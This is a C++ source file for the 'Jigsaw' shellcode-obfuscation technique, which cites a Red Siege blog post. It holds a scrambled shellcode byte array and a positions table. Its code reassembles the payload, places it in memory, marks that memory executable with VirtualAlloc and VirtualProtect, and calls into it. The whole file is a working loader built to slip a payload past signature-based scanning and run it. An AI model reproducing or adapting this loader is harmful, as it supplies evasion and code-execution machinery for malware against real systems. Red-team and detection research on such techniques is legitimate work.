/*
* Shellcode Obfuscation: Jigsaw
* Resources:
*	- https://redsiege.com/blog/2024/09/adventures-in-shellcode-obfuscation-part-12-jigsaw/
*/
#include <Windows.h>
#include <iostream>

VOID Jigsaw(unsigned char* jigsaw, int positions[], size_t positionsLen, unsigned char* shellcode) {
    for (int i = 0; i < positionsLen; i++) {
        shellcode[positions[i]] = jigsaw[i];
    }
}

int main() {
    // jigsaw and positions were generated by Jigsaw.py
    unsigned char jigsaw[] =
        "\x41\x00\x41\x72\x01\x89\x01\x41\x42\xed\x8b\xff"
        "\x00\x24\xc9\x3c\x8d\x51\x88\xd0\xd0\x00\xe2\x01"
        "\x75\x56\x5a\x59\x12\x01\xe4\x58\xe3\x8b\x58\xd1"
        "\xd8\x48\x5a\x41\x40\xff\x83\x59\x65\x34\x31\x0f"
        "\x41\x48\xc1\x48\x24\x52\x00\x52\x48\x41\x56\x20"
        "\x0d\x60\x49\x4c\x41\x01\x48\x6a\x06\xac\x48\x5e"
        "\xb5\x8b\x00\x74\x28\xfc\x58\x38\x01\x01\x48\x40"
        "\x31\x48\x20\x00\xd0\x00\xc9\x59\xd5\x8b\x41\xac"
        "\xd5\xbb\x00\x41\x48\x48\x8b\xe0\x8b\x01\x50\x9d"
        "\x5d\x75\xc0\xba\x48\xe0\x48\x00\x41\xba\x8b\x00"
        "\x59\x6f\x4a\x50\x50\x80\x72\x52\x44\x00\x41\xe9"
        "\x52\xf0\x7c\x87\xff\x41\x00\x58\xa6\xc0\x0c\x41"
        "\x52\xc9\x66\x41\xbd\x48\xe0\x58\x01\x18\x63\x40"
        "\xff\xd0\x85\x48\x45\xd5\x41\x20\x5a\xd0\x52\xc9"
        "\x1c\x44\x02\xff\x8b\x41\x48\x01\x8b\x4d\x83\xba"
        "\xbb\x8b\x18\x08\x83\x88\xc1\x01\xc4\x41\x3c\x47"
        "\x39\x8b\x4c\xfb\xc1\x80\x61\x65\x48\xc0\x56\x48"
        "\xc9\x00\x6c\x41\x78\x8b\x41\x65\x8b\x48\xc0\xff"
        "\x4d\x0d\x44\x67\xd2\x2e\xda\x61\x6f\x48\x88\x48"
        "\xa2\x0a\x13\xff\x00\xb7\xd0\x2c\x8d\x51\x49\x48"
        "\x7c\x20\x8b\x31\x00\x75\x57\x03\x95\x8b\x05\xf0"
        "\xe8\x63\xc1\x48\x00\x04\x00\x20\x31\xd6\x3c\x31"
        "\x49\x51\x8b\x01\xec\x4a\x52\x48\xf1\xff\x41\x31"
        ;

    int positions[] = {
        107, 275, 171, 35, 167, 263, 148, 191, 72, 63, 68, 199,
        80, 146, 123, 245, 214, 66, 79, 149, 101, 82, 62, 216,
        140, 103, 175, 174, 196, 126, 3, 170, 102, 108, 177, 139,
        141, 29, 193, 10, 97, 200, 242, 179, 274, 109, 18, 38,
        220, 117, 122, 182, 135, 27, 218, 187, 104, 121, 232, 185,
        124, 24, 159, 132, 59, 60, 83, 259, 246, 120, 25, 173,
        230, 92, 209, 86, 244, 0, 142, 128, 217, 89, 241, 157,
        43, 21, 54, 9, 168, 210, 106, 261, 240, 163, 176, 48,
        227, 228, 206, 178, 67, 17, 195, 251, 96, 112, 13, 238,
        202, 130, 85, 221, 111, 129, 33, 81, 262, 204, 22, 7,
        192, 258, 41, 36, 91, 249, 257, 31, 155, 8, 169, 197,
        69, 4, 247, 225, 226, 55, 211, 190, 235, 119, 153, 12,
        64, 44, 150, 180, 237, 154, 189, 172, 160, 28, 270, 145,
        201, 76, 84, 166, 137, 266, 162, 70, 181, 161, 14, 116,
        158, 143, 52, 239, 30, 233, 1, 205, 71, 114, 2, 234,
        254, 144, 94, 136, 183, 110, 127, 75, 243, 65, 73, 255,
        138, 77, 134, 250, 61, 78, 268, 20, 194, 6, 16, 93,
        57, 219, 269, 151, 273, 223, 186, 272, 156, 74, 47, 105,
        42, 58, 95, 87, 19, 271, 264, 50, 224, 203, 165, 37,
        231, 248, 256, 188, 207, 39, 90, 53, 215, 15, 99, 88,
        51, 32, 34, 115, 260, 252, 198, 133, 236, 152, 253, 229,
        5, 267, 56, 213, 212, 164, 208, 98, 46, 113, 49, 222,
        147, 11, 26, 100, 184, 40, 23, 45, 131, 265, 125, 118
    };

    // Decode the shellcode.
    size_t positionsLen = sizeof(positions) / sizeof(positions[0]);
    unsigned char shellcode[sizeof(jigsaw)] = {};
    Jigsaw(jigsaw, positions, positionsLen, shellcode);

    // -----------------------------------------------------------------------------
    // The following code is the Shellcode Injection example.
    // -----------------------------------------------------------------------------

    LPVOID lpExec = VirtualAlloc(0, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!lpExec) return FALSE;

    memcpy(lpExec, shellcode, sizeof(shellcode));

    DWORD dwOldProtect = 0;
    if (!VirtualProtect(lpExec, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        VirtualFree(lpExec, 0, MEM_RELEASE);
        return FALSE;
    }

    ((void(*)())lpExec)();

    return 0;
}